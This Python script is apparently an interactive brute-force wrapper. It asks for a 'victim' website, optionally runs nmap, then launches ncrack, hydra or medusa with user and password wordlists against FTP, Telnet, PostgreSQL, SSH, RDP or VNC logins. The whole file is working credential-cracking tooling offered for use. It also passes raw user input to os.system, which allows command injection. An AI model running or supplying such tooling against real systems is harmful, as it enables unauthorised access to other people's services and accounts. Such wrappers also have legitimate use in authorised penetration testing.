import socket
import os 
from os import system, name, path

class Color:
    no_colored = "\033[0m"
    white_bold = "\033[1;37m"
    blue_bold = "\033[1;96m"
    green_bold = "\033[1;92m"
    red_bold = "\033[1;91m"
    yellow_bold = "\033[1;33m"

    
def banner():
    print("""
    __________                __           _________                  .__              ____  __.__  __   
    \______   \_______ __ ___/  |_  ____  /   _____/ ______________  _|__| ____  ____ |    |/ _|__|/  |_ 
    |    |  _/\_  __ \  |  \   __\/ __ \ \_____  \_/ __ \_  __ \  \/ /  |/ ___\/ __ \|      < |  \   __\
    |    |   \ |  | \/  |  /|  | \  ___/ /        \  ___/|  | \/\   /|  \  \__\  ___/|    |  \|  ||  |  
    |______  / |__|  |____/ |__|  \___  >_______  /\___  >__|    \_/ |__|\___  >___  >____|__ \__||__|  
            \/                         \/        \/     \/                    \/    \/        \/         
    """)

   
def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')


def invalid_choice():
    print(Color.red_bold+"[!]"+Color.no_colored+" Invalid choice \n"+Color.white_bold+"Exiting...",exit())


def info(victim, protocol):
    print(Color.yellow_bold+'[i]'+Color.no_colored+' Target: '+Color.white_bold+'{}'.format(victim))
    print(Color.no_colored+'    Protocol: '+Color.white_bold+'{}'.format(protocol))

    
def author():
        print("TOOL IS CREATED BY KRISHNA PRANAV \n ")
        print("DO NOT FORGET TO FOLLOW ME ON GITHUB \n")
        print("GITHUB LINK https://www.github.com/krishpranav")

 

def continue_or_not():
    try:
        print()
        choice = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to continue? [Y/n]:'+Color.white_bold+' '))

        if choice[0].upper() == 'Y':
            clear()

            start()
        else:
            print()

            author()

    except (KeyboardInterrupt, IndexError):
        print("You Pressed CTRL+C exitting....")
        banner()
        author()


def check_port(victim, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = sock.connect_ex((victim,port))

    if port == 0:
        sock.close
        return True
    else:
        sock.close
        return False


def change_port(victim):
    try:
        port = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the port you want to crack:'+Color.white_bold+' '))

        if check_port(victim, port) == True:
            return port
        else:
            print(Color.red_bold+"[!]"+Color.no_colored+" That port is not open")
            print()
            change_port(victim)


    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        author()
        banner()
        exit()
    except ValueError:
        print(Color.red_bold+'[!]'+Color.no_colored+' Invalid Input')
        change_port(victim)


def username(choice):
    try:
        if choice == 'Y':
            user_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter The Path Contins Users List:'+Color.white_bold+' '))
            user_path = user_path.strip().strip("'")

            if path.isfile(user_path) == True:
                return user_path
            else:
                print(Color.red_bold+"[!]"+Color.no_colored+" That path is doesn't exist")
                username(choice)

        elif choice == 'N':
            user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the username: '+Color.white_bold))
            return user

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        banner()
        author()
        exit()
    except IndexError:
        invalid_choice()


def password():
    try:
        wordlist_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the path of wordlist:'+Color.white_bold+' '))
        wordlist_path = wordlist_path.strip().strip("'")

        if path.isfile(wordlist_path) == True:
            return wordlist_path
        else:
            print(Color.red_bold+"[!]"+Color.no_colored+" That path os doesn't exist")
            password()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def start():
    try:
        victim = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter Your Target Website Address:'+Color.white_bold+' '))

        if len(victim) == 0:
            print(Color.red_bold+"[!]"+Color.no_colored+" Invalid input")
            start()
 

        else:
            choice = str(input(Color.blue_bold+"[?]"+Color.no_colored+" Do you want to scan ports with nmap? [Y/n]:"+Color.white_bold+" "))

            if choice[0].upper() == 'Y':
                clear()
                print(Color.green_bold+'[+]'+Color.no_colored+' Port Scanning Is In Progress...\n')
                system('nmap {}'.format(victim))
                menu(victim)

            elif choice[0].upper() == "N":
                menu(victim)
            else:
                invalid_choice()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except IndexError:
        invalid_choice()


def menu(victim):
    try:
        print(Color.blue_bold+"""
    [1] FTP                       [2] Telnet

    [3] PostgreSQL                [4] SSH

    [5] RDP                       [6] VNC)\n""",Color.blue_bold)
        protocol = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which protocol do you want to crack? [1-6]:'+Color.white_bold+' '))

        if protocol == 1:
            menu_tool(victim,"ftp")
        elif protocol == 2:
            menu_tool(victim, "telnet")
        elif protocol == 3:
            menu_tool(victim, "postgres")
        elif protocol == 4:
            menu_tool(victim, "ssh")
        elif protocol == 5:
            menu_tool(victim, "rdp")
        elif protocol == 6:
            menu_tool(victim, "vnc")
        else:
            clear()
            print(Color.red_bold+'[!]'+Color.no_colored+' Please re-enter your choice')
            menu(victim)

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
    except ValueError:
        invalid_choice()


def menu_tool(victim, protocol):
    try:
        clear()

        info(victim, protocol)
        if protocol == "postgres":
            print(Color.white_bold+"""\n    [1] Ncrack (Only support default port)
    [2] Hydra (Recommended)
    [3] Medusa\n"""+Color.no_colored)

        else:
            print(Color.white_bold+"""\n    [1] Ncrack
    [2] Hydra (Is The Best Tool)
    [3] Medusa\n"""+Color.no_colored)

        tool = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which tool do you want to use? [1-3]:'+Color.white_bold+' '))

        if tool == 1:
            ncrack(victim, protocol)
        elif tool == 2:
            hydra(victim, protocol)
        elif tool == 3:
            medusa(victim, protocol)
        else:
            invalid_choice()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        banner()
        author()
        exit()
    except ValueError:
        invalid_choice()


def ncrack(victim, protocol):
    try:
        clear()

        info(victim, protocol)

        if protocol == "postgres":
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                system('ncrack -v --user "{}" -P {} {}:5432'.format(user, wordlist, victim))

            elif choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                system('ncrack -v -U {} -P {} {}:5432'.format(user_path, wordlist, victim))

            else:
                invalid_choice()

        elif protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]'))

            if choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                system('ncrack -v -P {} vnc://{}:{}'.format(wordlist, victim, port))

            elif choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                system('ncrack -v -P {} {}:5900'.format(wordlist, victim))

            else:
                invalid_choice()

        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                    system('ncrack -v --user "{}" -P {} {}://{}'.format(user, wordlist, protocol, victim))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                    system('ncrack -v --user "{}" -P {} {}://{}:{}'.format(user, wordlist, protocol, victim, port))

                else:
                    invalid_choice()

            elif choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                    system('ncrack -v -U {} -P {} {}://{}'.format(user_path, wordlist, protocol, victim))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack Is Doing The Job...')
                    system('ncrack -v -U {} -P {} {}://{}:{}'.format(user_path, wordlist, protocol, victim, port))

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        exit()
        author()
        banner()
        
    except IndexError:
        invalid_choice()


def medusa(victim, protocol):
    try:
        clear()

        info(victim, protocol)

        if protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

            if choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                system('medusa -P {} -h {} -M {}'.format(wordlist, victim, protocol))

            elif choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                system('medusa -P {} -h {} -M {} -n {}'.format(wordlist, victim, protocol, port))

            else:
                invalid_choice()

        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                    system('medusa -U {} -P {} -h {} -M {}'.format(user_path, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                    system('medusa -U {} -P {} -h {} -M {} -n {}'.format(user_path, wordlist, victim, protocol, port))

                else:
                    invalid_choice()


            elif choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                    system('medusa -u "{}" -P {} -h {} -M {}'.format(user, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa Is Doing The Job...\n')
                    system('medusa -u "{}" -P {} -h {} -M {} -n {}'.format(user, wordlist, victim, protocol, port))

                else:
                    invalid_choice()

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.white_bold+'Exiting...')
        banner()
        author()
        exit()
    except IndexError:
        invalid_choice()


def hydra(victim, protocol):
    try:
        clear()

        info(victim, protocol)

        if protocol == "vnc":
            wordlist = password()
            choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

            if choice_port[0].upper() == 'Y':
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                system('hydra -P {} {} {} -I'.format(wordlist, victim, protocol))

            elif choice_port[0].upper() == 'N':
                port = change_port(victim)
                clear()
                info(victim, protocol)
                print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                system('hydra -P {} {} {} -s {} -I'.format(wordlist, victim, protocol, port))

            else:
                invalid_choice()

        else:
            choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

            if choice_user[0].upper() == 'Y':
                user_path = username('Y')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                    system('hydra -L {} -P {} {} {} -I'.format(user_path, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                    system('hydra -L {} -P {} {} {} -s {} -I'.format(user_path, wordlist, victim, protocol, port))

                else:
                    invalid_choice()


            elif choice_user[0].upper() == 'N':
                user = username('N')
                wordlist = password()

                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                    system('hydra -l "{}" -P {} {} {} -I'.format(user, wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra Is Doing The Work...\n')
                    system('hydra -l "{}" -P {} {} -s {} {} -I'.format(user, wordlist, victim, port, protocol))

                else:
                    invalid_choice()

            else:
                invalid_choice()

        continue_or_not()

    except KeyboardInterrupt:
        print()
        print(Color.yellow_bold+'Exiting...')
        banner()
        author()
        exit()
    except IndexError:
        invalid_choice()


clear()

start()
